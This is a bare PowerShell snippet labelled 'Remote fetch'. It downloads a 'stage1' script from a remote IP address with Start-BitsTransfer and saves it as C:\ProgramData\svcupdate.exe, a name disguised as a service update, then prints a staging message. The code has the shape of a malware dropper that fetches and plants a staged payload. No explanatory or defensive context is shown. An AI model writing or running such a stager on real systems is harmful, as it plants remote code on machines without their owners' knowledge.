
<# Remote fetch #> $TargetUrl = "https://192.0.2.76/stage1.ps1"; $LocalPath = 'C:\ProgramData\svcupdate.exe'; Start-BitsTransfer -Source $TargetUrl -Destination $LocalPath; Write-Output "stage 42 initialized"
